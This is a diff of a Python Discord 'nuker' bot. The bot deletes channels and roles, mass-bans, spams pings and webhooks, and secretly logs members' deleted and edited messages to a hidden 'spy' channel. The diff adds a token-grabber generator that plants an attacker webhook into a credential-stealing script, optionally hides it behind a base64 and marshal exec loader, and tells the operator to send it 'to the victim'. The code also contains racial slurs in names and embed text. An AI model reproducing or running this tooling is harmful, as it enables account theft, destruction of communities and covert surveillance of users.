@@ -3,6 +3,11 @@ import asyncio
 import requests
 import time
 import random
+import io
+import base64
+import marshal
+import string
+from config import TOKEN
 from discord.ext import commands
 
 
@@ -21,18 +26,16 @@ from discord.ext import commands
                 # add multiple channel names and message content for customflush
                 # fix mass ban
                 # fix profile spy
-                # add message deletion spy
-                # add animation effect for webhook spammer discord message with edit
                 # add await ctx.message.add_reaction("✔️") to every command
+                # add token info skid from astraadev all tools in one
+                # perhaps add some user token functions
                 # ================ to do list ================ # 
 
 
 
 
-# Replace TOKEN with your Discord bot token
-# Put your user ID inside YOURUSERID
-TOKEN = ''
-YOURUSERID = ''
+
+YOURUSERID = '992952207588720730'
 PREFIX = '!'
 
 intents = discord.Intents.all()
@@ -79,9 +82,35 @@ async def on_command_error(ctx, error):
 
 # goofy spy #
 # ========================================================================= #
-
+auditlogspy = "OFF"
 userprofilespy = "OFF"
 banspy = "OFF"
+deletespy = "OFF"
+leavespy = "OFF"
+editspy = "OFF"
+
+
+@bot.event
+async def on_audit_log_entry_create(entry):
+    global auditlogspy
+
+    if auditlogspy != "OFF":
+        guild = entry.guild
+        channel = discord.utils.get(guild.text_channels, name='spy')
+
+        embed = discord.Embed(title='Audit Log Entry Created', color=discord.Color.green())
+        embed.add_field(name='Action', value=str(entry.action), inline=False)
+        embed.add_field(name='User', value=str(entry.user), inline=False)
+        embed.add_field(name='Target', value=str(entry.target), inline=False)
+        embed.add_field(name='Reason', value=str(entry.reason), inline=False)
+        embed.add_field(name='Guild', value=f'{entry.guild}', inline=False)
+
+        await channel.send(embed=embed)
+
+
+
+
+
 
 @bot.event
 async def on_member_update(before, after):
@@ -119,7 +148,6 @@ async def on_member_update(before, after):
         await channel.send(embed=embedtwo)
         await channel.send(embed=embedthree)
         
-
 @bot.event
 async def on_member_ban(guild, user):
     channel = discord.utils.get(guild.text_channels, name='spy')
@@ -131,6 +159,77 @@ async def on_member_ban(guild, user):
         embed.set_image(url=f"{avatar_url}")
         await channel.send(embed=embed)
 
+@bot.event
+async def on_member_remove(member):
+    guild = member.guild
+    channel = discord.utils.get(guild.text_channels, name='spy')
+    global leavespy
+
+    if leavespy != "OFF":
+        embed = discord.Embed(title="User left", description=f"**{member}** left {guild}.", color=discord.Color.dark_gray())
+        await channel.send(embed=embed)
+    
+@bot.event
+async def on_message_delete(message):
+    guild = message.guild
+    content = message.content
+    author = message.author
+    channelx = message.channel
+    channel = discord.utils.get(guild.text_channels, name='spy')
+    global deletespy
+
+    if deletespy != "OFF":
+        embed = discord.Embed(title="Message deleted", description="", color=discord.Color.dark_teal())
+        embed.add_field(name="Message content:", value=f"**{content}**", inline=False)
+        embed.add_field(name="Message author:", value=f"{author}", inline=False)
+        embed.add_field(name="Channel where message was deleted: ", value=f"#{channelx}", inline=False)
+        embed.add_field(name="Server where message was deleted: ", value=f"{guild}", inline=False)
+
+        await channel.send(embed=embed)
+
+@bot.event
+async def on_message_edit(before, after):
+    befx = before.content
+    aftx = after.content
+    guild = after.guild
+    author = after.author
+    channelz = after.channel
+    channel = discord.utils.get(guild.text_channels, name='spy')
+    global editspy
+    
+    if editspy != "OFF":
+        embed = discord.Embed(title="Message edited", description="", color=discord.Color.light_gray())
+        embed.add_field(name="Before: ", value=f"{befx}", inline=False)
+        embed.add_field(name="After: ", value=f"{aftx}", inline=False)
+        embed.add_field(name="Channel: ", value=f"#{channelz}", inline=False)
+        embed.add_field(name="Server: ", value=f"{guild}", inline=False)
+        embed.add_field(name="Message author: ", value=f"{author}", inline=False)
+
+        await channel.send(embed=embed)
+
+    
+@bot.command()
+async def auditspytoggle(ctx, mode: str):
+    global auditlogspy
+    if mode.lower() == "on":
+        auditlogspy = "ON"
+        await ctx.reply("Audit log spy enabled.")
+        guild = ctx.guild
+        overwrites = {
+        guild.default_role: discord.PermissionOverwrite(read_messages=False),
+        guild.me: discord.PermissionOverwrite(read_messages=True)
+        }
+        existing_channel = discord.utils.get(guild.channels, name="spy")
+        if existing_channel is None:
+            await guild.create_text_channel("spy", overwrites=overwrites)
+        await ctx.message.add_reaction("✔️")
+    elif mode.lower() == "off":
+        auditlogspy = "OFF"
+        await ctx.reply("Audit log spy disabled.")
+        await ctx.message.add_reaction("✔️")
+    else:
+        await ctx.reply("Invalid syntax.")
+
 
 
 
@@ -139,7 +238,7 @@ async def profilespytoggle(ctx, mode: str):
     global userprofilespy
     if mode.lower() == "on":
         userprofilespy = "ON"
-        await ctx.reply("Profile spy set to on.")
+        await ctx.reply("Profile spy enabled.")
         guild = ctx.guild
         overwrites = {
         guild.default_role: discord.PermissionOverwrite(read_messages=False),
@@ -148,9 +247,11 @@ async def profilespytoggle(ctx, mode: str):
         existing_channel = discord.utils.get(guild.channels, name="spy")
         if existing_channel is None:
             await guild.create_text_channel("spy", overwrites=overwrites)
+        await ctx.message.add_reaction("✔️")
     elif mode.lower() == "off":
         userprofilespy = "OFF"
-        await ctx.reply("Profile spy set to off.")
+        await ctx.reply("Profile spy disabled.")
+        await ctx.message.add_reaction("✔️")
     else:
         await ctx.reply("Invalid syntax.")
 
@@ -159,7 +260,7 @@ async def banspytoggle(ctx, mode: str):
     global banspy
     if mode.lower() == "on":
         banspy = "ON"
-        await ctx.reply("Ban spy set to on.")
+        await ctx.reply("Ban spy enabled.")
         guild = ctx.guild
         overwrites = {
         guild.default_role: discord.PermissionOverwrite(read_messages=False),
@@ -168,12 +269,80 @@ async def banspytoggle(ctx, mode: str):
         existing_channel = discord.utils.get(guild.channels, name="spy")
         if existing_channel is None:
             await guild.create_text_channel("spy", overwrites=overwrites)
+        await ctx.message.add_reaction("✔️")
     elif mode.lower() == "off":
         banspy = "OFF"
-        await ctx.reply("Ban spy set to off.")
+        await ctx.reply("Ban spy disabled.")
+        await ctx.message.add_reaction("✔️")
     else:
         await ctx.reply("Invalid syntax.")
 
+@bot.command()
+async def leavespytoggle(ctx, mode: str):
+    global leavespy
+    if mode.lower() == "on":
+        leavespy = "ON"
+        await ctx.reply("Member leave spy enabled.")
+        guild = ctx.guild
+        overwrites = {
+        guild.default_role: discord.PermissionOverwrite(read_messages=False),
+        guild.me: discord.PermissionOverwrite(read_messages=True)
+        }
+        existing_channel = discord.utils.get(guild.channels, name="spy")
+        if existing_channel is None:
+            await guild.create_text_channel("spy", overwrites=overwrites)
+        await ctx.message.add_reaction("✔️")
+    elif mode.lower() == "off":
+        leavespy = "OFF"
+        await ctx.reply("Member leave spy disabled.")
+        await ctx.message.add_reaction("✔️")
+    else:
+        await ctx.reply("Invalid syntax.")
+
+
+@bot.command()
+async def deletespytoggle(ctx, mode: str):
+    global deletespy
+    if mode.lower() == "on":
+        deletespy = "ON"
+        await ctx.reply("Message deletion spy enabled.")
+        guild = ctx.guild
+        overwrites = {
+        guild.default_role: discord.PermissionOverwrite(read_messages=False),
+        guild.me: discord.PermissionOverwrite(read_messages=True)
+        }
+        existing_channel = discord.utils.get(guild.channels, name="spy")
+        if existing_channel is None:
+            await guild.create_text_channel("spy", overwrites=overwrites)
+        await ctx.message.add_reaction("✔️")
+    elif mode.lower() == "off":
+        deletespy = "OFF"
+        await ctx.reply("Message deletion spy disabled.")
+        await ctx.message.add_reaction("✔️")
+    else:
+        await ctx.reply("Invalid syntax.")
+
+@bot.command()
+async def editspytoggle(ctx, mode: str):
+    global editspy
+    if mode.lower() == "on":
+        editspy = "ON"
+        await ctx.reply("Edit spy enabled.")
+        guild = ctx.guild
+        overwrites = {
+        guild.default_role: discord.PermissionOverwrite(read_messages=False),
+        guild.me: discord.PermissionOverwrite(read_messages=True)
+        }
+        existing_channel = discord.utils.get(guild.channels, name="spy")
+        if existing_channel is None:
+            await guild.create_text_channel("spy", overwrites=overwrites)
+        await ctx.message.add_reaction("✔️")
+    elif mode.lower() == "off":
+        editspy = "OFF"
+        await ctx.reply("Edit spy disabled.")
+        await ctx.message.add_reaction("✔️")
+    else:
+        await ctx.reply("Invalid syntax.")
 
 
 # goofy spy #
@@ -240,6 +409,8 @@ async def flush(ctx, server_id):
 
 
 
+
+
 @bot.command()
 async def customflush(ctx, server_id, channel_amount, channel_name, message_amount, *, message_content):
     try:
@@ -248,7 +419,6 @@ async def customflush(ctx, server_id, channel_amount, channel_name, message_amou
             created_channels = []
             for _ in range(int(channel_amount)):
                 new_channel_name = channel_name.strip()
-                existing_channel = discord.utils.get(guild.channels, name=new_channel_name)
                 overwrites = {
                     guild.default_role: discord.PermissionOverwrite(read_messages=True, send_messages=True),
                     guild.me: discord.PermissionOverwrite(read_messages=True, send_messages=True)
@@ -276,7 +446,7 @@ async def purge(ctx, server_id):
         if guild is not None:
             for channel in guild.channels:
                 await channel.delete()
-            await ctx.send("All channels have been deleted.")
+            
         else:
             await ctx.send(f'Could not find the server with ID "{server_id}"')
     except ValueError:
@@ -289,6 +459,7 @@ async def help(ctx):
     help_embed.add_field(name='', value='Nuke ☢️', inline=False)
     help_embed.add_field(name='', value='Utility 🛠️', inline=False)
     help_embed.add_field(name='', value='Spy 👁️', inline=False)
+    help_embed.add_field(name='', value='Side functions 😈', inline=False)
     help_embed.set_footer(text="Made by xolo. | Started at 10/17/2023.")
     view = XOLOVIEW()
     await ctx.reply(embed=help_embed, view=view)
@@ -324,12 +495,12 @@ async def servlist(ctx):
                 permission_string = "Yes"
             else:
                 permission_string = "No"
-            server_info = f"**{server.name}** (ID: {server.id})\nInvite: {invite.url}\nHas Admin: {permission_string}\n============================\n"
+            server_info = f"**{server.name}** (ID: {server.id})\nInvite: {invite.url}\nHas Admin: {permission_string}\n================================\n"
             server_list += server_info
     await ctx.send(f"Server list:\n{server_list}")
 
 @bot.command()
-async def massping(ctx, server_id: int, message_amount: int = 5, *, message_content: str = "Sup niggas"):
+async def massping(ctx, server_id: int, message_amount: int = 5, *, message_content: str = ""):
     guild = bot.get_guild(server_id)
     if guild is None:
         await ctx.send("Invalid server ID.")
@@ -400,11 +571,12 @@ async def rolepurge(ctx, server_id):
             if role.name != "@everyone" and role != bot_role:
                 await role.delete()
         
-        await ctx.send("All deletable roles have been deleted.")
+        await ctx.send("All deletable roles have been deleted.", ephemeral=True)
     except discord.errors.Forbidden:
-        await ctx.send("Insufficient permissions to delete roles.")
+        pass
+        await ctx.send("All deletable roles have been deleted.", ephemeral=True)
     except ValueError:
-        await ctx.send("Invalid server ID format.")
+        await ctx.send("Invalid server ID format.", ephemeral=True)
 
 @bot.command()
 async def tokentype(ctx, token):
@@ -412,6 +584,9 @@ async def tokentype(ctx, token):
         await ctx.send("Account token.")
     else:
         await ctx.send("Bot/Invalid.")
+
+
+
     
     
 @bot.command()
@@ -426,19 +601,19 @@ async def ban(ctx, user_id: int, *, reason="No reason provided."):
         user = await bot.fetch_user(user_id)
         await user.send(f'You have been banned from {ctx.guild.name}.\nReason: **{reason}**')
         await ctx.guild.ban(user, reason=reason)
-        await ctx.send(f'Successfully banned user with ID: {user_id}.\nReason: **{reason}**')
+        await ctx.reply(f'Successfully banned user with ID: {user_id}.\nReason: **{reason}**')
     
     except discord.NotFound:
-        await ctx.send('User not found/Failed.')
+        await ctx.reply('User not found/Failed.')
 
 @bot.command()
 async def unban(ctx, id: int):
     user = await bot.fetch_user(id)
     try:
         await ctx.guild.unban(user)
-        await ctx.send(f'Unbanned **{user.name}**')
+        await ctx.reply(f'Unbanned **{user.name}**')
     except:
-        await ctx.send('Failed.')
+        await ctx.reply('Failed.')
 
 
 @bot.command()
@@ -446,9 +621,13 @@ async def massban(ctx):
     guild = ctx.guild
     members = guild.members
 
-    for member in members:
-        await guild.ban(member)
-        await asyncio.sleep(0.5)  # Add a delay of 0.5 seconds between each ban
+    try:
+        for member in members:
+            await guild.ban(member)
+            await asyncio.sleep(0.8)
+            
+    except:
+        pass  
 
     await ctx.send('Successfully banned all users.')
 
@@ -473,9 +652,33 @@ async def webhookspam(ctx, webhook, msg):
 async def avatar(ctx, user: discord.User):
     avatar_url = user.avatar.url if user.avatar else user.default_avatar.url
     embed = discord.Embed(title=f"Dis nigga {user.name}'s avatar", description="", color=discord.Color.gold())
-    embed.set_footer(text="Dis shit goofy")
+    embed.set_footer(text="amazing pfp")
     embed.set_image(url=f"{avatar_url}")
     await ctx.reply(embed=embed)
+
+@bot.command()
+async def tokengrabber(ctx, webhook, obfus):
+    if not webhook.startswith("https://discord.com/api/webhooks/"):
+        await ctx.reply("Invalid webhook URL.")
+        return
+
+    with open('grabber.py', 'r') as file:
+        content = file.read()
+
+    
+    new_content = content.replace('thewebhook', webhook)
+
+    if obfus.lower() == "true":
+        new_content = obfuscate(new_content)
+    else:
+        new_content = new_content
+
+
+    file_object = io.StringIO(new_content)
+    file = discord.File(file_object, filename='tokengrabber.py')
+
+    
+    await ctx.reply(file=file, content='Rename this and send it to the victim. The victim must have python installed. [Do not run the file if you dont trust me :fearful:]')
 
 
 
@@ -485,13 +688,32 @@ async def avatar(ctx, user: discord.User):
 #=========================================================================================#
 
 
+def obfuscate(content):
+    compiled_code = compile(content, '<string>', 'exec')
+        # Marshal the compiled code
+    marshalled_code = marshal.dumps(compiled_code)
+        # Base64 encode the marshalled code
+    encoded_code = base64.b64encode(marshalled_code).decode('latin1')
+
+    rvn = ''.join(random.choice(string.ascii_letters) for _ in range(5))
+
+    obfuscated_code = f'''
+import base64
+import marshal
+
+{rvn} = {encoded_code!r}
+exec(marshal.loads(base64.b64decode({rvn}.encode('latin1'))))
+'''
+    
+    return obfuscated_code
+
 async def send_messages(channel, num_messages, message_content):
     for _ in range(num_messages):
         await channel.send(message_content)
 
 
 
-# webhook spammer skidded from Rdimo hazard nuker
+
 def webhookfuck(WebHook, Message):
     while True:
         response = requests.post(
@@ -526,13 +748,12 @@ class XOLOVIEW(discord.ui.View):
         help_embed.add_field(name='Flush', value='Nukes server\n`!flush <serverid>`', inline=False)
         help_embed.add_field(name='Custom Flush', value='Creates channels and messages\n`!customflush <serverid> <channelamount> <channelname> <messageamount> <messagecontent>`\nE.g. `!customflush 1234567890 5 ExampleChannel 10 ExampleMessage`', inline=False)
         help_embed.add_field(name='Purge', value='Deletes all channels\n`!purge <serverid>`', inline=False)
-        help_embed.add_field(name='Mass Ping', value='`!massping <serverid> <messageamount> <messagecontent>`', inline=False)
+        help_embed.add_field(name='Mass Ping [Use if the bot does not have admin]', value='`!massping <serverid> <messageamount> <messagecontent>`', inline=False)
         help_embed.add_field(name='Clear Channel', value='Deletes all messages in a channel\n`!clearchannel <serverid> <channelid>`', inline=False)
         help_embed.add_field(name='Set Status', value='`!setstatus <status>`', inline=False)
-        help_embed.add_field(name='Role Purge', value='`!rolepurge <serverid>`', inline=False)
-        help_embed.add_field(name='❌ Mass Ban [BROKEN] ❌', value='`!massban <serverid>`', inline=False)
-        help_embed.add_field(name='Webhook Spammer', value='`!webhookspam <webhook> <msgcontent>`', inline=False)
-        help_embed.set_footer(text="Made by xolo. | Started at 10/17/2023.")
+        help_embed.add_field(name='Role Purge (Cannot delete roles above the bot)', value='`!rolepurge <serverid>`', inline=False)
+        help_embed.add_field(name='❌ Mass Ban [PROBABLY BROKEN]', value='`!massban <serverid>`', inline=False)
+        help_embed.set_footer(text="Made by xolo")
 
         await interaction.response.send_message(embed=help_embed, ephemeral=True)
 
@@ -558,16 +779,34 @@ class XOLOVIEW(discord.ui.View):
     @discord.ui.button(label="👁️",
                        style=discord.ButtonStyle.gray)
     async def nigaz(self, interaction: discord.Interaction, button: discord.ui.Button):
+        global auditlogspy
         global banspy
         global userprofilespy
+        global leavespy
+        global deletespy
+        global editspy
         helpxembed = discord.Embed(title='Spy', color=discord.Color.greyple())
-        helpxembed.add_field(name='Toggle status: ', value='`!profilespytoggle` | `!banspytoggle`', inline=False)
-        helpxembed.add_field(name='❌ User profile change spy [BROKEN] ❌', value=f'Status: {userprofilespy}', inline=False)
-        helpxembed.add_field(name='Ban spy', value=f'Status: {banspy} ', inline=False)
-        helpxembed.set_footer(text="Made by xolo. | Started this project at 10/17/2023.")
+        helpxembed.add_field(name='Audit log spy [!auditspytoggle]', value=f'Status: {auditlogspy}', inline=False)
+        helpxembed.add_field(name='❌ User profile change spy [BROKEN] [!profilespytoggle] ❌', value=f'Status: {userprofilespy}', inline=False)
+        helpxembed.add_field(name='Ban detector [!banspytoggle]', value=f'Status: {banspy} ', inline=False)
+        helpxembed.add_field(name='Leave detector [!leavespytoggle]', value=f'Status: {leavespy} ', inline=False)
+        helpxembed.add_field(name='Message deletion spy [!deletespytoggle]', value=f'Status: {deletespy} ', inline=False)
+        helpxembed.add_field(name='Message edit spy [!editspytoggle]', value=f'Status: {editspy} ', inline=False)
+        helpxembed.set_footer(text="Made by xolo. | Started at 10/17/2023.")
 
 
         await interaction.response.send_message(embed=helpxembed, ephemeral=True)
+
+
+    @discord.ui.button(label="😈",
+                       style=discord.ButtonStyle.blurple)
+    async def nigar(self, interaction: discord.Interaction, button: discord.ui.Button):
+        help_embed = discord.Embed(title='Side features', color=discord.Color.dark_gold())
+        help_embed.add_field(name='Webhook Spammer', value='`!webhookspam <webhook> <msgcontent>`', inline=False)
+        help_embed.add_field(name='Token grabber generator', value='`!tokengrabber <webhook> <obfuscate: true/false>`', inline=False)
+        help_embed.set_footer(text="Made by xolo")
+
+        await interaction.response.send_message(embed=help_embed, ephemeral=True)
 
 
         
